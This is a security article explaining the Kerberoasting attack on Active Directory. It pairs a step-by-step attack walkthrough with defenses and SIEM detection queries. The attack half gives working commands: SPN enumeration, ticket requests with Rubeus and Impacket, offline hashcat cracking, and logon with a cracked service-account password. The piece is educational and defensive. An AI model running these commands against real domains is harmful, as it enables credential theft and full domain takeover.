## The Kerberoasting Attack

### Step 0: Initial Context

The attacker has a **compromised standard user account** (via phishing, password spray, etc.) on the `CORP.LOCAL` domain. They have no admin privileges and are looking to escalate.

> **Starting point:** The attacker has already compromised a basic user account. They are now looking to elevate their privileges.

---

### Step 1: SPN Enumeration

The attacker queries Active Directory to list all accounts with a **Service Principal Name (SPN)**.

```powershell
# PowerShell - SPN Enumeration
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName |
    Select Name, ServicePrincipalName
```

**Enumeration results:**

| Account | SPN |
|---------|-----|
| `svc_sql_prod` | `MSSQLSvc/srv-sql01.corp.local:1433` |
| `svc_exchange` | `exchangeMDB/mail.corp.local` |
| `svc_backup_admin` | `cifs/backup-srv.corp.local` |
| `svc_sharepoint` | `HTTP/sharepoint.corp.local` |

> **Priority targets:** Accounts named "admin", "backup", "migration" are often members of privileged groups (Domain Admins, Backup Operators...).

---

### Step 2: TGS Request (Ticket Granting Service)

1. **Attacker → KDC:** "I want to access service `MSSQLSvc/srv-sql01.corp.local:1433`" *(with my valid TGT as proof of identity)*

2. **KDC checks:**
   - Valid TGT? **YES**
   - Authenticated user? **YES**
   - Service exists? **YES**
   - **There is no verification whatsoever about the user's actual usage of the service**

3. **KDC → Attacker:** "Here is your TGS to access SQL Server"
   - **The TGS is encrypted with the NTLM Hash of the `svc_sql_prod` account password**

```bash
# With Rubeus (pentest tool)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# With Impacket (Python)
GetUserSPNs.py CORP.LOCAL/jean:password -dc-ip 192.168.1.10 -request
```

> **From a process standpoint, this is a 100% legitimate operation:** No connection attempt to the SQL server, no authentication failure, no alert generated by default. Kerberos works as designed.

---

### Step 3: Hash Extraction from the TGS

The received TGS ticket is parsed to extract the hash in Hashcat format:

```
$krb5tgs$23$*svc_sql_prod$CORP.LOCAL$MSSQLSvc/srv-sql01.corp.local:1433*$
a1b2c3d4e5f6789abcdef0123456789abcdef0123456789abcdef0123456789
[...data encrypted with the NTLM hash of the password...]
xyz9876543210fedcba9876543210fedcba9876543210fedcba9876543210
```

**What this hash contains:**

- **Public part:** account name (`svc_sql_prod`), domain (`CORP.LOCAL`), requested SPN
- **Encrypted part (the target):** data encrypted with the NTLM Hash of `svc_sql_prod`'s password — this is the part the attacker will try to crack

---

### Step 4: Offline Hash Cracking (Brute Force)

> **Note:** This step takes place on the attacker's machine, completely **offline**. No connection to the network.

```bash
# Hashcat - TGS hash cracking
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# -m 13100 = Kerberos 5 TGS-REP etype 23 (RC4) mode
# rockyou.txt = Dictionary of 14 million passwords
```

The cracking process:

1. **Test:** `Password123` → Compute NTLM Hash → Compare → ❌
2. **Test:** `Welcome2024` → Compute NTLM Hash → Compare → ❌
3. **Test #458,392:** `SqlService2019!` → Compute NTLM Hash → Compare → ✅ **MATCH!**

**PASSWORD CRACKED!**
- **Account:** `svc_sql_prod`
- **Password:** `SqlService2019!`

> **Why it's dangerous:** No attempt limit (no lockout), no real-time alerts, can take days/weeks without detection, attacker can use a massive GPU cluster.

---

### Step 5: Post-Compromise Exploitation

```powershell
runas /user:CORP\svc_sql_prod cmd.exe
# Password: SqlService2019!
```

```powershell
whoami /groups
# Result:
# CORP\Domain Admins
# CORP\Backup Operators
# CORP\Schema Admins
```

**With Domain Admins, the attacker can:**
- Dump all domain NTLM hashes (DCSync)
- Create persistent admin accounts
- Install backdoors on all servers
- Exfiltrate all sensitive data
- Deploy ransomware across the entire network

---

### Attack Summary

| Step | Action | Detectable? | Required Privileges |
|------|--------|------------|-------------------|
| **1. SPN Enumeration** | LDAP query in AD | ❌ Difficult | Standard user |
| **2. TGS Request** | Legitimate Kerberos request | ❌ Not by default | Standard user |
| **3. Hash Extraction** | Local ticket parsing | ❌ No network trace | None |
| **4. Offline Cracking** | Local brute force | ❌ Completely invisible | None |
| **5. Exploitation** | Legitimate authentication | ⚠️ Possible | Domain Admin (if targeted account) |

## Defenses Against Kerberoasting

### Defense-in-Depth Strategy

Defense must be multi-layered:

- **Prevention:** Prevent the attack from succeeding, make cracking impossible
- **Detection:** Identify the attack in progress, real-time alerts, honeypots
- **Response:** Rapid isolation, ticket revocation, forensic investigation

---

### 1. Complex Passwords for Service Accounts

**Objective:** Make hash cracking **mathematically impossible**.

**WEAK password (crackable in 5 minutes):**
```
SqlService2019!
```
- 15 characters, common pattern (word + year + symbol), found in dictionaries

**STRONG password (cracking time: several millennia):**
```
X9$mK#pL2@vN8!qR4&wT6^yU
```
- 25+ characters, fully random, estimated cracking time: **6.7 billion years**

| Length | Complexity | Cracking Time (RTX 4090) | Recommendation |
|--------|-----------|------------------------|----------------|
| 8 chars | Alphanumeric | 2 seconds | ❌ Dangerous |
| 12 chars | + Symbols | 3 minutes | ❌ Insufficient |
| 15 chars | + Symbols | 2 days | ⚠️ Weak |
| 20 chars | + Symbols | 850 years | ✅ Acceptable |
| 25+ chars | + Symbols | Billions of years | ✅ Recommended |

```powershell
# PowerShell - Strong password generation (25 characters)
-join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42,43,45,46,47,58,61,63,64,94) |
    Get-Random -Count 25 |
    ForEach-Object {[char]$_})
```

### 2. gMSA Deployment (Group Managed Service Accounts)

**Solution:** gMSAs are service accounts whose password is **automatically generated and managed by Active Directory**.

**gMSA advantages:**
- 120-character password (impossible to crack)
- Automatic rotation every 30 days
- No human knows the password
- Total immunity against Kerberoasting

```powershell
# 1. Create the KDS Root Key (once per domain)
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))

# 2. Create the gMSA
New-ADServiceAccount -Name "gMSA-SQL-Prod" `
    -DNSHostName "srv-sql01.corp.local" `
    -PrincipalsAllowedToRetrieveManagedPassword "SRV-SQL01$"

# 3. Install on the SQL server
Install-ADServiceAccount -Identity "gMSA-SQL-Prod"

# 4. Configure the SQL service to use the gMSA
# Account: CORP\gMSA-SQL-Prod$
# Password: (leave blank - managed automatically)
```

> The `gMSA-SQL-Prod$` account has a 120-character random password that changes automatically every 30 days.

---

### 3. Enforce AES Encryption (Disable RC4)

The RC4 algorithm (type 23) is obsolete and much faster to crack than AES.

| Algorithm | Kerberos Type | Cracking Speed | Recommendation |
|----------|--------------|----------------|----------------|
| RC4-HMAC | Type 23 | 100 billion hash/s | ❌ DISABLE |
| AES128-CTS | Type 17 | 10 million hash/s | ✅ Acceptable |
| AES256-CTS | Type 18 | 5 million hash/s | ✅ Recommended |

Enforcing AES256 drastically slows down cracking.

```
# GPO - Disable RC4
# Computer Configuration → Windows Settings → Security Settings →
# Local Policies → Security Options
# "Network security: Configure encryption types allowed for Kerberos"

☑ AES128_HMAC_SHA1
☑ AES256_HMAC_SHA1
☐ RC4_HMAC_MD5      ← DISABLE
☐ DES_CBC_CRC       ← DISABLE
☐ DES_CBC_MD5       ← DISABLE
```

### 4. Principle of Least Privilege

**Common critical mistake:** Service accounts are members of **Domain Admins** "to simplify permissions".

- ❌ `svc_sql_prod` member of **Domain Admins** → If cracked = full compromise possible
- ✅ `svc_sql_prod` with minimal permissions (SQL read/write only) → If cracked = limited impact

> **Note:** A service account should never be Domain Admin. It is recommended to use dedicated groups with granular permissions.

---

### 5. Detection via Event Logs (SIEM)

**Event ID 4769:** Each TGS request generates this event on the domain controller.

**Suspicious patterns:**
- Abnormal volume: +10 TGS in 5 minutes
- Rarely used SPNs
- Encryption Type = RC4 (0x17)
- Requests outside business hours

```sql
-- Splunk Query Example - Kerberoasting Detection
index=windows EventCode=4769
| where TicketEncryptionType="0x17"
| where ServiceName!="krbtgt" AND ServiceName!="*$"
| stats count by src_ip, user, ServiceName
| where count > 5
| table _time, user, src_ip, ServiceName, count
```

```sql
-- Azure Sentinel Query Example (KQL) - Advanced Detection
SecurityEvent
| where EventID == 4769
| where ServiceName !endswith "$" and ServiceName != "krbtgt"
| where TicketEncryptionType == "0x17"
| summarize
    RequestCount = count(),
    UniqueServices = dcount(ServiceName),
    Services = make_set(ServiceName)
    by Account, IpAddress, bin(TimeGenerated, 5m)
| where RequestCount > 5 OR UniqueServices > 3
```

### 6. Honeypot SPN (Canary Tokens)

**Strategy:** Create decoy service accounts with attractive names. **Any TGS request = 100% confirmed attack**.

```powershell
# 1. Create the account with an attractive name
New-ADUser -Name "SQL_Backup_Admin" `
    -AccountPassword (ConvertTo-SecureString "Tr3sC0mpl3x3P@ssw0rd!2024#Sec" -AsPlainText -Force) `
    -Enabled $true `
    -Description "HONEYPOT - Do not use"

# 2. Assign an SPN
setspn -A MSSQLSvc/honeypot-backup.corp.local:1433 SQL_Backup_Admin

# 3. Configure a SIEM alert
# Event 4769 WHERE ServiceName = "MSSQLSvc/honeypot-backup.corp.local:1433"
# → Immediate critical alert
```

**Attractive honeypot names:** `SQL_Admin_Backup`, `Exchange_Migration_Svc`, `VMware_vCenter_Admin`, `Backup_Domain_Admin`, `SAP_Super_User`

---

### 7. Regular Password Rotation

- ❌ Password set in 2015 → Never changed in 10 years
- ✅ Rotation every 90 days (minimum) / 30 days (recommended)
- ✅ Automated via scripts or gMSA

---

### 8. Continuous Service Account Auditing

```powershell
$ServiceAccounts = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName, MemberOf, PasswordLastSet, Enabled

foreach ($account in $ServiceAccounts) {
    $groups = $account.MemberOf | ForEach-Object {
        (Get-ADGroup $_).Name
    }

    $isDomainAdmin = $groups -contains "Domain Admins"
    $passwordAge = (Get-Date) - $account.PasswordLastSet

    [PSCustomObject]@{
        Account = $account.Name
        SPN = $account.ServicePrincipalName -join "; "
        IsDomainAdmin = $isDomainAdmin
        PasswordAgeDays = $passwordAge.Days
        Enabled = $account.Enabled
        Alert = ($isDomainAdmin -or $passwordAge.Days -gt 90)
    }
}
```

### Incident Response Playbook

1. **Immediate isolation (< 5 min):** Block source IP, disable compromised account, isolate machine (quarantine VLAN)
2. **Revocation and rotation (< 15 min):** Reset passwords for ALL SPN accounts, purge active Kerberos tickets, revoke sessions
3. **Investigation (< 1h):** Memory dump, Event Log analysis over 30 days, LDAP reconnaissance search
4. **Post-incident hardening:** gMSA deployment, RC4 disabling, SPN honeypots, SIEM enhancement
